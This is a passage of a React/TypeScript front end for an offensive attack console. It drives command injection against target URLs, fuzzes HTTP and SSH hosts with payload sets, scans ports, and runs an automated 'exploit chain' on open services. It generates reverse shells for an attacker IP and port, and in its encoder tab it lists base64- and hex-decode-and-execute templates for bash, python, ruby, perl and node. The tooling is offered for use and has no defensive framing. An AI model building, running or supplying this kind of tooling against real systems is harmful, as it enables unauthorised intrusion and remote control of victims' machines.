  const [fuzzTpl,  setFuzzTpl]  = useState("cat FUZZ");
  const [fuzzSet,  setFuzzSet]  = useState(Object.keys(FUZZ_SETS)[0]!);
  const [fuzzRes,  setFuzzRes]  = useState<FuzzResult[]>([]);
  const [fuzzing,  setFuzzing]  = useState(false);
  const [fuzzProg, setFuzzProg] = useState(0);
  const fuzzAbort = useRef(false);

  // Fuzzer SSH state
  const [fuzzMode,    setFuzzMode]    = useState<"http"|"ssh">("http");
  const [fuzzSshHost, setFuzzSshHost] = useState("");
  const [fuzzSshPort, setFuzzSshPort] = useState(22);
  const [fuzzSshUser, setFuzzSshUser] = useState("root");
  const [fuzzSshPass, setFuzzSshPass] = useState("");
  const [fuzzSshKey,  setFuzzSshKey]  = useState("");

  // Encoder state
  const [encIn,  setEncIn]  = useState("");
  const [encOut, setEncOut] = useState("");
  const [encType,setEncType]= useState<EncType>("base64");

  // Scanner state
  const [scanTarget,  setScanTarget]  = useState("");
  const [scanPreset,  setScanPreset]  = useState("TOP 40");
  const [scanCustom,  setScanCustom]  = useState("");
  const [scanTimeout, setScanTimeout] = useState(1200);
  const [scanResults, setScanResults] = useState<ScanResult[]>([]);
  const [scanning,    setScanning]    = useState(false);
  const [scanDone,    setScanDone]    = useState(false);
  const [scanMs,      setScanMs]      = useState(0);
  const [scanScanned, setScanScanned] = useState(0);
  const [scanTotal,   setScanTotal]   = useState(0);
  const [scanOpenCount, setScanOpenCount] = useState(0);

  const [chainTarget,  setChainTarget]  = useState("");
  const [chainRunning, setChainRunning] = useState(false);
  const [chainSteps,   setChainSteps]   = useState<Array<{step:number;service:string;port:number;action:string;result:string;status:"success"|"failed"|"skipped";elapsed:number}>>([]);
  const [chainDone,    setChainDone]    = useState(false);

  const termRef    = useRef<HTMLDivElement>(null);
  const wsRef      = useRef<WebSocket|null>(null);
  const scanWsRef  = useRef<WebSocket|null>(null);
  const chainWsRef = useRef<WebSocket|null>(null);

  const { data: hubStatus } = useGetHubStatus({ query:{refetchInterval:15000,queryKey:getGetHubStatusQueryKey()} });
  const { data: engines   } = useGetEngines(  { query:{refetchInterval:30000,queryKey:getGetEnginesQueryKey()} });
  const { data: logs      } = useGetLogs(     undefined, { query:{refetchInterval:3000, queryKey:getGetLogsQueryKey()} });
  const clearLogs             = useClearLogs();
  const suggestParams         = { mode, cmd };
  const { data: suggestions, refetch: fetchSuggestions } = useGetSuggestions(suggestParams, {
    query:{ enabled:false, queryKey:getGetSuggestionsQueryKey(suggestParams) },
  });

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [output]);

  // Keyboard shortcuts
  useEffect(() => {
    const h = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") { e.preventDefault(); handleInject(); }
      if (e.key === "F1") { e.preventDefault(); setTab("AUTOCHAIN"); }
      if (e.key === "F2") { e.preventDefault(); setTab("TERMINAL"); }
      if (e.key === "F3") { e.preventDefault(); setTab("SCANNER"); }
      if (e.key === "F4") { e.preventDefault(); setTab("FUZZER"); }
      if (e.key === "F5") { e.preventDefault(); setTab("SHELLS"); }
      if (e.key === "F6") { e.preventDefault(); setTab("ENCODER"); }
      if (e.key === "F7") { e.preventDefault(); setTab("LIBRARY"); }
      if (e.key === "F8") { e.preventDefault(); setTab("OOB"); }
      if (e.key === "F9") { e.preventDefault(); setTab("REPLAYS"); }
      if (e.key === "F10") { e.preventDefault(); setTab("CVE"); }
    };
    window.addEventListener("keydown", h);
    return () => window.removeEventListener("keydown", h);
  }, []);

  const handleProbe = useCallback(() => {
    if (!injectionUrl.trim() || probing) return;
    setProbing(true);
    setProbeResult(null);
    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${proto}//${window.location.host}/api/ws/probe`);
    ws.onopen = () => ws.send(JSON.stringify({ url: injectionUrl.trim() }));
    ws.onmessage = (ev) => {
      try {
        const msg = JSON.parse(ev.data as string) as { type: string; summary?: string; message?: string };
        if (msg.type === "result" && msg.summary) setProbeResult(msg.summary);
        else if (msg.type === "error")             setProbeResult(`[ERROR] ${msg.message ?? "probe failed"}`);
        else if (msg.type === "end")               setProbing(false);
      } catch { /* */ }
    };
    ws.onerror  = () => { setProbeResult("[ERROR] WebSocket error"); setProbing(false); };
    ws.onclose  = () => setProbing(false);
  }, [injectionUrl, probing]);

  const handleInject = useCallback(() => {
    if (!cmd.trim() || running) return;
    wsRef.current?.close();
    wsRef.current = null;
    if (cmd.trim()) {
      setHistory(h => [cmd, ...h.filter(x=>x!==cmd)].slice(0,100));
      setHistIdx(-1);
    }
    setOutput(prev => prev + `root@${target||"nexus"}:~# ${cmd}\n`);
    setRunning(true);
    setChain(cmd.split(/[;&|`$(){}]/).map(s=>s.trim()).filter(s=>s.length>1&&s.length<60));

    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${proto}//${window.location.host}/api/ws/exec`);
    wsRef.current = ws;
    ws.onopen    = () => ws.send(JSON.stringify({
      cmd, engine, mode, target,
      injectionUrl: injectionUrl.trim() || undefined,
      injectParam:  injectParam.trim()  || undefined,
      httpMethod:   httpMethod          || undefined,
      customHeaders: customHeaders.trim() || undefined,
      attackerIp:   attIp,
      attackerPort: attPort,
    }));
    ws.onmessage = (ev) => {
      const msg = JSON.parse(ev.data as string) as {type:string;chunk?:string;message?:string;code?:number;elapsed?:number};
      if (msg.type==="data" && msg.chunk) setOutput(p=>p+msg.chunk);
      else if (msg.type==="end") {
        const el = msg.elapsed ?? 0;
        setScore(p=>p+25+(el>3000?55:0));
        setStats(p=>({...p, total:p.total+1, [mode]:((p as Record<string,number>)[mode]??0)+1}));
        setOutput(p=>p+`\n[exit:${msg.code??-1} | ${el}ms]\n\n`);
        setRunning(false);
        qc.invalidateQueries({queryKey:getGetLogsQueryKey()});
      } else if (msg.type==="error") {
        setOutput(p=>p+`[ERROR] ${msg.message}\n\n`);
        setRunning(false);
      }
    };
    ws.onerror = () => { setOutput(p=>p+"[WS] connection error\n\n"); setRunning(false); };
    ws.onclose = () => { setRunning(false); wsRef.current=null; };
  }, [cmd,engine,mode,target,injectionUrl,injectParam,httpMethod,customHeaders,attIp,attPort,running,qc]);

  const histNav = (dir: "up"|"down") => {
    if (!history.length) return;
    if (dir==="up") {
      if (histIdx===-1) setDraft(cmd);
      const n=Math.min(histIdx+1,history.length-1);
      setHistIdx(n); setCmd(history[n]!);
    } else {
      if (histIdx<=0) { setHistIdx(-1); setCmd(draft); return; }
      const n=histIdx-1; setHistIdx(n); setCmd(history[n]!);
    }
  };

  const handleFuzz = async () => {
    if (!fuzzTpl.includes("FUZZ")) return;
    if (fuzzMode === "http" && !injectionUrl.trim()) {
      setFuzzRes([{payload:"[config]",output:"Set a Target URL in the TERMINAL tab before fuzzing.",elapsed:0,ok:false}]);
      return;
    }
    if (fuzzMode === "ssh" && !fuzzSshHost.trim()) {
      setFuzzRes([{payload:"[config]",output:"Enter an SSH Host before fuzzing.",elapsed:0,ok:false}]);
      return;
    }
    const payloads = FUZZ_SETS[fuzzSet] ?? [];
    fuzzAbort.current = false;
    setFuzzing(true); setFuzzRes([]); setFuzzProg(0);
    for (let i=0;i<payloads.length;i++) {
      if (fuzzAbort.current) break;
      const payload  = payloads[i]!;
      const injected = fuzzTpl.replace(/FUZZ/g, payload);
      const t0 = Date.now();
      try {
        const body = fuzzMode === "ssh"
          ? JSON.stringify({
              cmd:         injected,
              engine,
              mode,
              sshHost:     fuzzSshHost.trim(),
              sshPort:     fuzzSshPort,
              sshUser:     fuzzSshUser.trim() || "root",
              sshPassword: fuzzSshPass.trim() || undefined,
              sshKey:      fuzzSshKey.trim()  || undefined,
            })
          : JSON.stringify({
              cmd:           injected,
              engine,
              mode,
              targetUrl:     injectionUrl.trim(),
              injectParam:   injectParam.trim() || "cmd",
              httpMethod:    httpMethod || "GET",
              customHeaders: customHeaders.trim() || undefined,
              attackerIp:    attIp  || "127.0.0.1",
              attackerPort:  attPort || "4444",
            });
        const r = await fetch("/api/hub/exec",{method:"POST",headers:{"Content-Type":"application/json"},body});
        const d = await r.json() as {output?:string;elapsed?:number;error?:string};
        setFuzzRes(prev=>[...prev,{payload,output:(d.output??d.error??"").slice(0,120),elapsed:d.elapsed??Date.now()-t0,ok:r.ok}]);
      } catch {
        setFuzzRes(prev=>[...prev,{payload,output:"[network error]",elapsed:Date.now()-t0,ok:false}]);
      }
      setFuzzProg(Math.round(((i+1)/payloads.length)*100));
    }
    setFuzzing(false);
  };

  const handleScan = () => {
    const tgt = (scanTarget||target).trim();
    if (!tgt) return;

    let ports: number[];
    if (scanPreset === "CUSTOM") {
      ports = scanCustom.split(/[\s,]+/).map(Number).filter(p=>p>0&&p<65536);
      if (!ports.length) return;
    } else {
      ports = SCAN_PRESETS[scanPreset] ?? SCAN_PRESETS["TOP 40"]!;
    }

    // Close any existing scan WS
    if (scanWsRef.current) { scanWsRef.current.close(); scanWsRef.current = null; }

    setScanResults([]); setScanDone(false);
    setScanScanned(0);  setScanTotal(ports.length);
    setScanOpenCount(0); setScanMs(0);
    setScanning(true);

    const t0 = Date.now();
    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${proto}//${window.location.host}/api/ws/scan`);
    scanWsRef.current = ws;

    ws.onopen = () => {
      ws.send(JSON.stringify({ target: tgt, ports, timeout: scanTimeout, concurrency: 30 }));
    };

    ws.onmessage = (ev) => {
      const msg = JSON.parse(ev.data as string) as {
        type: string;
        port?: number; open?: boolean; service?: string; banner?: string;
        scanned?: number; total?: number; openCount?: number;
        elapsed?: number; message?: string;
      };

      if (msg.type === "portResult") {
        const result: ScanResult = {
          port:    msg.port    ?? 0,
          open:    msg.open    ?? false,
          service: msg.service ?? "unknown",
          banner:  msg.banner  ?? "",
        };
        // Open ports appear immediately at the top; closed accumulate below
        setScanResults(prev =>
          result.open
            ? [result, ...prev.filter(r => !r.open), ...prev.filter(r => r.open === false && r.port !== result.port)]
            : [...prev, result]
        );
        setScanScanned(msg.scanned ?? 0);
        setScanOpenCount(msg.openCount ?? 0);

      } else if (msg.type === "end") {
        setScanMs(msg.elapsed ?? Date.now() - t0);
        setScanDone(true);
        setScanning(false);
        scanWsRef.current = null;

      } else if (msg.type === "error") {
        setScanResults([{ port: 0, open: false, service: "error", banner: msg.message ?? "scan error" }]);
        setScanning(false);
        scanWsRef.current = null;
      }
    };

    ws.onerror = () => {
      setScanResults([{ port: 0, open: false, service: "error", banner: "WebSocket connection failed — check server" }]);
      setScanning(false);
      scanWsRef.current = null;
    };

    ws.onclose = () => {
      setScanning(false);
      scanWsRef.current = null;
    };
  };

  const handleAbortScan = () => {
    if (scanWsRef.current) { scanWsRef.current.close(); scanWsRef.current = null; }
    setScanning(false);
    setScanDone(true);
  };

  type ChainStep = { step: number; service: string; port: number; action: string; result: string; status: "success"|"failed"|"skipped"; elapsed: number };

  const handleExploitChain = () => {
    const tgt = (chainTarget || target).trim();
    if (!tgt || chainRunning) return;
    if (chainWsRef.current) { chainWsRef.current.close(); chainWsRef.current = null; }
    setChainRunning(true);
    setChainDone(false);
    setChainSteps([]);

    const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${proto}//${window.location.host}/api/ws/chain`);
    chainWsRef.current = ws;

    ws.onopen = () => ws.send(JSON.stringify({ target: tgt }));

    ws.onmessage = (ev) => {
      const msg = JSON.parse(ev.data as string) as {
        type: string;
        step?: ChainStep;
        port?: number; service?: string;
        target?: string; total?: number;
        message?: string;
      };
      if (msg.type === "portOpen") {
        setChainSteps(prev => [...prev, {
          step: prev.length + 1, service: msg.service ?? "unknown", port: msg.port ?? 0,
          action: `Port ${msg.port} open — exploiting...`, result: "●", status: "failed", elapsed: 0,
        }]);
      } else if (msg.type === "step" && msg.step) {
        setChainSteps(prev => {
          const idx = prev.findIndex(s => s.port === msg.step!.port && s.result === "●");
          if (idx >= 0) { const n = [...prev]; n[idx] = msg.step!; return n; }
          return [...prev, msg.step!];
        });
      } else if (msg.type === "end") {
        setChainDone(true); setChainRunning(false); chainWsRef.current = null;
      } else if (msg.type === "error") {
        setChainSteps(prev => [...prev, { step: prev.length+1, service:"error", port:0, action:"Chain error", result: msg.message ?? "unknown", status:"failed", elapsed:0 }]);
        setChainDone(true); setChainRunning(false); chainWsRef.current = null;
      }
    };

    ws.onerror = () => {
      setChainSteps(prev => [...prev, { step: prev.length+1, service:"error", port:0, action:"WebSocket error", result:"Connection failed — check server", status:"failed", elapsed:0 }]);
      setChainRunning(false); chainWsRef.current = null;
    };

    ws.onclose = () => { setChainRunning(false); if (chainWsRef.current === ws) chainWsRef.current = null; };
  };

  const handleAbortChain = () => {
    if (chainWsRef.current) { chainWsRef.current.close(); chainWsRef.current = null; }
    setChainRunning(false); setChainDone(true);
  };

  const sub = (s: string) => s.replace(/ATTACKER_IP/g,attIp||"ATTACKER_IP").replace(/ATTACKER_PORT/g,attPort||"4444");

  const copy = (text: string, id: string) => {
    navigator.clipboard.writeText(text).catch(()=>{});
    setCopyId(id);
    setTimeout(()=>setCopyId(null),1400);
  };

  const shells = buildShells(attIp, attPort);
  const listeners = buildListeners(attPort);
  const shellCats = ["All",...Array.from(new Set(shells.map(s=>s.cat)))];
  const filteredShells = shellCat==="All" ? shells : shells.filter(s=>s.cat===shellCat);
  const libEntry = PAYLOAD_LIBRARY[libCat]!;
  const libFiltered = libSearch.trim()
    ? PAYLOAD_LIBRARY.flatMap(c=>c.p.filter(p=>p.toLowerCase().includes(libSearch.toLowerCase())).map(p=>({p,col:c.col,cat:c.cat})))
    : libEntry.p.map(p=>({p,col:libEntry.col,cat:libEntry.cat}));
  const openPorts = scanResults.filter(r=>r.open);

  // ── TERMINAL ──────────────────────────────────────────
  const tabTerminal = () => (
    <div className="flex-1 flex flex-col min-h-0">
      <div className="flex items-center justify-between bg-zinc-950 border-b border-zinc-900 px-3 py-1.5 shrink-0">
        <div className="flex items-center gap-2">
          <span className="w-2.5 h-2.5 rounded-full bg-red-500"/>
          <span className="w-2.5 h-2.5 rounded-full bg-yellow-500"/>
          <span className="w-2.5 h-2.5 rounded-full bg-green-500"/>
          <span className="text-xs text-zinc-500 ml-2">root@{target||"nexus"}:~#</span>
          {running && <span className="text-xs text-red-400 animate-pulse ml-1">● LIVE</span>}
        </div>
        <div className="flex items-center gap-3 text-xs">
          <span className={MODE_COLOR[mode]??"text-zinc-400"}>{mode.toUpperCase()}</span>
          <span className="text-zinc-700">{engine}</span>
          <button onClick={()=>{setOutput("");setChain([]);}} className="text-zinc-700 hover:text-red-400 uppercase">CLR</button>
          <button onClick={()=>copy(output,"term-out")} className={`uppercase ${copyId==="term-out"?"text-green-400":"text-zinc-700 hover:text-zinc-400"}`}>
            {copyId==="term-out"?"COPIED":"COPY"}
          </button>
        </div>
      </div>
      <div ref={termRef} className="flex-1 overflow-y-auto p-3 font-mono text-xs leading-relaxed bg-black min-h-0">
        <div className="whitespace-pre-wrap break-words">
          {output.split("\n").map((line, i) => (
            <div key={i} className={colorLine(line)}>{line || "\u00a0"}</div>
          ))}
        </div>
        {running && <span className="inline-block w-2 h-3 bg-lime-400 animate-pulse align-text-bottom ml-0.5"/>}
      </div>
      {chain.length>1&&(
        <div className="border-t border-zinc-900 bg-zinc-950 px-3 py-1.5 flex items-center gap-1.5 overflow-x-auto shrink-0">
          <span className="text-[10px] text-red-600 uppercase shrink-0">chain:</span>
          {chain.map((c,i)=>(
            <React.Fragment key={i}>
              <span className="px-2 py-0.5 bg-red-950/50 border border-red-900/60 text-red-400 text-[10px] whitespace-nowrap">{c}</span>
              {i<chain.length-1&&<span className="text-zinc-700 text-[10px]">→</span>}
            </React.Fragment>
          ))}
        </div>
      )}
      {suggestions&&suggestions.length>0&&(
        <div className="border-t border-zinc-900 bg-zinc-950 px-3 py-1.5 shrink-0">
          <div className="text-[10px] text-zinc-600 uppercase mb-1">Payload Suggestions</div>
          <div className="flex flex-wrap gap-1">
            {suggestions.map((s: string, i: number)=>(
              <button key={i} onClick={()=>setCmd(s)} title={s}
                className="text-[10px] bg-zinc-900 text-lime-400 px-1.5 py-0.5 border border-zinc-800 hover:bg-zinc-800 max-w-xs truncate">
                {s.length>52?s.slice(0,52)+"…":s}
              </button>
            ))}
          </div>
        </div>
      )}
    </div>
  );

  // ── FUZZER ────────────────────────────────────────────
  const tabFuzzer = () => (
    <div className="flex-1 flex flex-col p-3 gap-3 overflow-y-auto">
      {/* Target mode selector */}
      <div className="flex items-center gap-0.5 border border-zinc-800 rounded p-0.5 w-fit">
        <button onClick={()=>setFuzzMode("http")}
          className={`px-3 py-1 text-[10px] uppercase font-bold transition-colors rounded-sm ${fuzzMode==="http"?"bg-red-900 text-red-200":"text-zinc-600 hover:text-zinc-400"}`}>
          HTTP
        </button>
        <button onClick={()=>setFuzzMode("ssh")}
          className={`px-3 py-1 text-[10px] uppercase font-bold transition-colors rounded-sm ${fuzzMode==="ssh"?"bg-cyan-900 text-cyan-200":"text-zinc-600 hover:text-zinc-400"}`}>
          SSH
        </button>
      </div>

      {/* SSH credential panel — visible only in SSH mode */}
      {fuzzMode === "ssh" && (
        <div className="border border-cyan-900/50 bg-cyan-950/10 rounded p-3 flex flex-col gap-2">
          <div className="text-[9px] text-cyan-600 uppercase tracking-widest font-bold mb-0.5">SSH Target Credentials</div>
          <div className="flex gap-2 flex-wrap">
            <div className="flex flex-col gap-0.5">
              <span className="text-[9px] text-zinc-600 uppercase">Host / IP</span>
              <input value={fuzzSshHost} onChange={e=>setFuzzSshHost(e.target.value)}
                className="bg-black border border-zinc-800 px-2 py-1 text-xs text-cyan-300 font-mono focus:outline-none focus:border-cyan-700 w-36"
                placeholder="192.168.1.1"/>
            </div>
            <div className="flex flex-col gap-0.5">
              <span className="text-[9px] text-zinc-600 uppercase">Port</span>
              <input type="number" value={fuzzSshPort} onChange={e=>setFuzzSshPort(Number(e.target.value)||22)}
                className="bg-black border border-zinc-800 px-2 py-1 text-xs text-cyan-300 font-mono focus:outline-none focus:border-cyan-700 w-16"
                placeholder="22"/>
            </div>
            <div className="flex flex-col gap-0.5">
              <span className="text-[9px] text-zinc-600 uppercase">Username</span>
              <input value={fuzzSshUser} onChange={e=>setFuzzSshUser(e.target.value)}
                className="bg-black border border-zinc-800 px-2 py-1 text-xs text-cyan-300 font-mono focus:outline-none focus:border-cyan-700 w-24"
                placeholder="root"/>
            </div>
            <div className="flex flex-col gap-0.5">
              <span className="text-[9px] text-zinc-600 uppercase">Password</span>
              <input type="password" value={fuzzSshPass} onChange={e=>setFuzzSshPass(e.target.value)}
                className="bg-black border border-zinc-800 px-2 py-1 text-xs text-cyan-300 font-mono focus:outline-none focus:border-cyan-700 w-28"
                placeholder="(optional)"/>
            </div>
          </div>
          <div className="flex flex-col gap-0.5">
            <span className="text-[9px] text-zinc-600 uppercase">Private Key — PEM (optional)</span>
            <textarea value={fuzzSshKey} onChange={e=>setFuzzSshKey(e.target.value)}
              className="bg-black border border-zinc-800 px-2 py-1 text-[10px] text-cyan-300 font-mono focus:outline-none focus:border-cyan-700 w-full h-16 resize-none"
              placeholder={"-----BEGIN RSA PRIVATE KEY-----\n..."}/>
          </div>
        </div>
      )}

      <div className="text-[10px] text-zinc-500 uppercase">Use FUZZ as placeholder — each payload replaces it and fires</div>
      <input value={fuzzTpl} onChange={e=>setFuzzTpl(e.target.value)}
        className="w-full bg-black border border-zinc-800 px-2 py-1.5 text-sm text-lime-400 font-mono focus:outline-none focus:border-red-700"
        placeholder="cat FUZZ"/>
      <div>
        <div className="text-[10px] text-zinc-600 uppercase mb-1">Payload Set ({FUZZ_SETS[fuzzSet]?.length??0} payloads)</div>
        <select value={fuzzSet} onChange={e=>setFuzzSet(e.target.value)}
          className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-zinc-300 focus:outline-none focus:border-red-700">
          {Object.keys(FUZZ_SETS).map(k=><option key={k} value={k}>{k} ({FUZZ_SETS[k]?.length})</option>)}
        </select>
      </div>
      <div className="flex gap-2 items-center">
        <button onClick={handleFuzz} disabled={fuzzing||!fuzzTpl.includes("FUZZ")}
          className="px-4 py-1.5 bg-red-900 text-white text-xs uppercase font-bold hover:bg-red-800 disabled:opacity-40">
          {fuzzing?`FUZZING ${fuzzProg}%`:"FUZZ"}
        </button>
        {fuzzing&&<button onClick={()=>{fuzzAbort.current=true;setFuzzing(false);}} className="px-3 py-1.5 border border-red-700 text-red-500 text-xs uppercase">ABORT</button>}
        {fuzzRes.length>0&&!fuzzing&&<button onClick={()=>setFuzzRes([])} className="px-3 py-1.5 border border-zinc-800 text-zinc-600 text-xs uppercase">CLEAR</button>}
        <span className="text-zinc-700 text-xs ml-auto">{fuzzRes.length}/{FUZZ_SETS[fuzzSet]?.length??0}</span>
      </div>
      {fuzzing&&<div className="h-1.5 bg-zinc-900 rounded-full overflow-hidden"><div className="h-full bg-red-600 transition-all" style={{width:`${fuzzProg}%`}}/></div>}
      {fuzzRes.length>0&&(
        <div className="border border-zinc-900 bg-black overflow-auto flex-1 min-h-0">
          <table className="w-full text-[10px]">
            <thead className="bg-zinc-900 text-zinc-600 sticky top-0">
              <tr><th className="px-2 py-1 text-left font-normal">PAYLOAD</th><th className="px-2 py-1 text-left font-normal">OUTPUT</th><th className="px-2 py-1 text-left font-normal">MS</th><th className="px-2 py-1 font-normal">USE</th></tr>
            </thead>
            <tbody>
              {fuzzRes.map((r,i)=>(
                <tr key={i} className={`border-t border-zinc-900 ${r.ok?"hover:bg-zinc-900/30":"opacity-50"}`}>
                  <td className="px-2 py-0.5 text-cyan-400 font-mono max-w-[140px] truncate" title={r.payload}>{r.payload}</td>
                  <td className="px-2 py-0.5 text-zinc-300 max-w-[200px] truncate" title={r.output}>{r.output||<span className="text-zinc-700">empty</span>}</td>
                  <td className="px-2 py-0.5 text-zinc-600">{r.elapsed}</td>
                  <td className="px-2 py-0.5 text-center"><button onClick={()=>setCmd(fuzzTpl.replace(/FUZZ/g,r.payload))} className="text-zinc-600 hover:text-lime-400 uppercase">USE</button></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
      <div>
        <div className="text-[10px] text-zinc-600 uppercase mb-1">Set Preview</div>
        <div className="flex flex-wrap gap-1">
          {(FUZZ_SETS[fuzzSet]??[]).map((p,i)=><span key={i} className="text-[9px] px-1.5 py-0.5 bg-zinc-900 border border-zinc-800 text-cyan-400 font-mono">{p}</span>)}
        </div>
      </div>
    </div>
  );

  // ── ENCODER ───────────────────────────────────────────
  const tabEncoder = () => (
    <div className="flex-1 flex flex-col p-3 gap-3 overflow-y-auto">
      <div className="grid grid-cols-2 gap-2">
        <div>
          <div className="text-[10px] text-zinc-600 uppercase mb-1">Type</div>
          <select value={encType} onChange={e=>setEncType(e.target.value as EncType)}
            className="w-full bg-black border border-zinc-800 px-2 py-1 text-[11px] text-zinc-300 focus:outline-none focus:border-red-700">
            {ENC_TYPES.map(t=><option key={t.value} value={t.value}>{t.label}</option>)}
          </select>
        </div>
        <div className="flex items-end gap-2">
          <button onClick={()=>setEncOut(encodeText(encIn,encType))} className="flex-1 py-1.5 bg-red-900 text-white text-xs uppercase font-bold hover:bg-red-800">ENCODE</button>
          <button onClick={()=>setEncOut(decodeText(encIn,encType))} className="flex-1 py-1.5 bg-zinc-900 border border-zinc-800 text-zinc-300 text-xs uppercase hover:bg-zinc-800">DECODE</button>
        </div>
      </div>
      <div>
        <div className="flex justify-between items-center mb-1">
          <div className="text-[10px] text-zinc-600 uppercase">Input</div>
          <div className="flex gap-2">
            <button onClick={()=>{setEncIn(encOut);setEncOut("");}} className="text-[10px] text-zinc-700 hover:text-zinc-400 uppercase">SWAP</button>
            <button onClick={()=>setEncIn("")} className="text-[10px] text-zinc-700 hover:text-red-400 uppercase">CLR</button>
          </div>
        </div>
        <textarea value={encIn} onChange={e=>setEncIn(e.target.value)}
          className="w-full h-24 bg-black border border-zinc-800 px-2 py-1.5 text-lime-400 font-mono text-xs focus:outline-none focus:border-red-600 resize-none"
          placeholder="Enter text to encode/decode..." spellCheck={false}/>
      </div>
      <div>
        <div className="flex justify-between items-center mb-1">
          <div className="text-[10px] text-zinc-600 uppercase">Output</div>
          <div className="flex gap-2">
            <button onClick={()=>setCmd(encOut)} className="text-[10px] text-zinc-700 hover:text-lime-400 uppercase">→ INJECT</button>
            <button onClick={()=>copy(encOut,"enc-out")} className={`text-[10px] uppercase ${copyId==="enc-out"?"text-green-400":"text-zinc-700 hover:text-red-400"}`}>{copyId==="enc-out"?"COPIED":"COPY"}</button>
          </div>
        </div>
        <textarea value={encOut} readOnly className="w-full h-24 bg-black border border-zinc-900 px-2 py-1.5 text-cyan-400 font-mono text-xs resize-none focus:outline-none" placeholder="Output appears here..."/>
      </div>
      <div>
        <div className="text-[10px] text-zinc-600 uppercase mb-1">Quick Templates</div>
        <div className="grid grid-cols-1 gap-1">
          {[
            {label:"bash b64 decode",  val:`bash<<<$(base64 -d<<<{B64})`},
            {label:"printf hex exec",  val:`$(printf '{HEX}')`},
            {label:"python b64 exec",  val:`python3 -c "import base64,os;os.system(base64.b64decode('{B64}').decode())"`},
            {label:"ruby b64 exec",    val:`ruby -e "require 'base64';system(Base64.decode64('{B64}'))"`},
            {label:"perl b64 exec",    val:`perl -MMIME::Base64 -e "system(decode_base64('{B64}'))"`},
            {label:"node b64 exec",    val:`node -e "require('child_process').exec(Buffer.from('{B64}','base64').toString())"`},
          ].map((item,i)=>{
            const b64 = encIn ? btoa(encIn) : "{B64}";
            const hexStr = encIn ? Array.from(new TextEncoder().encode(encIn)).map(b=>`\\x${b.toString(16).padStart(2,"0")}`).join("") : "{HEX}";
            const resolved = item.val.replace("{B64}",b64).replace("{HEX}",hexStr);
            return (
              <div key={i} className="flex items-center gap-2 bg-zinc-900 border border-zinc-800 px-2 py-1">
                <span className="text-[9px] text-zinc-500 w-32 shrink-0">{item.label}</span>
                <span className="text-[9px] text-lime-400 font-mono truncate flex-1">{resolved}</span>
                <div className="flex gap-1 shrink-0">
                  <button onClick={()=>setCmd(resolved)} className="text-[9px] text-zinc-600 hover:text-lime-400 uppercase">USE</button>
                  <button onClick={()=>copy(resolved,`qt${i}`)} className={`text-[9px] uppercase ${copyId===`qt${i}`?"text-green-400":"text-zinc-600 hover:text-red-400"}`}>{copyId===`qt${i}`?"OK":"CPY"}</button>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );

  // ── SHELLS ────────────────────────────────────────────
  const tabShells = () => (
    <div className="flex-1 flex flex-col p-3 gap-3 overflow-y-auto">
      <div className="flex flex-wrap gap-1 shrink-0">
        {shellCats.map(c=>(
          <button key={c} onClick={()=>setShellCat(c)}
            className={`text-[9px] px-2 py-0.5 border uppercase transition-colors ${shellCat===c?"border-red-600 text-red-400 bg-red-950/20":"border-zinc-800 text-zinc-600 hover:border-zinc-600"}`}>
            {c}
          </button>
        ))}
      </div>
      <div className="flex flex-col gap-1 flex-1">
        {filteredShells.map((rs,i)=>(
          <div key={i} className="border border-zinc-800 bg-black px-2 py-1.5">
            <div className="flex justify-between items-center">
              <div className="flex items-center gap-2">
                <span className="text-[9px] text-zinc-700 border border-zinc-800 px-1 uppercase">{rs.cat}</span>
                <span className="text-[11px] text-zinc-300">{rs.name}</span>
              </div>
              <div className="flex gap-2">
                <button onClick={()=>{setCmd(rs.cmd);setTab("TERMINAL");}} className="text-[10px] text-zinc-600 hover:text-lime-400 uppercase">USE</button>
                <button onClick={()=>copy(rs.cmd,`rs${i}`)} className={`text-[10px] uppercase ${copyId===`rs${i}`?"text-green-400":"text-zinc-600 hover:text-red-400"}`}>{copyId===`rs${i}`?"COPIED":"COPY"}</button>
              </div>
            </div>
            <div className="text-[9px] text-zinc-700 font-mono truncate mt-0.5">{rs.cmd}</div>
          </div>
        ))}
      </div>
      <div className="shrink-0">
        <div className="text-[10px] text-red-500 uppercase mb-1.5">Listeners</div>
        <div className="space-y-1">
          {listeners.map((l,i)=>(
            <div key={i} className="border border-zinc-800 bg-black px-2 py-1.5 flex items-center gap-2">
              <span className="text-[11px] text-zinc-400 w-28 shrink-0">{l.name}</span>
              <span className="text-[9px] text-amber-400 font-mono truncate flex-1">{l.cmd}</span>
              <button onClick={()=>copy(l.cmd,`lst${i}`)} className={`text-[10px] shrink-0 uppercase ${copyId===`lst${i}`?"text-green-400":"text-zinc-600 hover:text-red-400"}`}>{copyId===`lst${i}`?"COPIED":"COPY"}</button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );

  // ── LIBRARY ───────────────────────────────────────────
  const tabLibrary = () => (
    <div className="flex-1 flex flex-col p-3 gap-2 overflow-hidden">
      <input value={libSearch} onChange={e=>setLibSearch(e.target.value)}
        className="w-full bg-black border border-zinc-800 px-2 py-1.5 text-[11px] text-zinc-300 focus:outline-none focus:border-red-700 shrink-0"
        placeholder="Search payloads..."/>
      {!libSearch.trim()&&(
        <div className="flex flex-wrap gap-1 shrink-0">
          {PAYLOAD_LIBRARY.map((lib,i)=>(
            <button key={i} onClick={()=>setLibCat(i)}
              className={`text-[9px] px-1.5 py-0.5 border uppercase transition-colors ${libCat===i?`border-red-700 ${lib.col} bg-red-950/20`:"border-zinc-800 text-zinc-600 hover:border-zinc-700"}`}>
              {lib.cat}
            </button>
          ))}
        </div>
      )}
      <div className="flex-1 overflow-y-auto min-h-0 border border-zinc-900 bg-black p-1">
        {libFiltered.length===0&&<div className="text-zinc-700 text-xs p-3">No payloads match.</div>}
        <div className="flex flex-col gap-0.5">
          {libFiltered.map((item,i)=>(
            <div key={i} className="flex items-center gap-2 border border-zinc-900 hover:border-zinc-700 bg-zinc-950 px-2 py-1 group cursor-pointer"
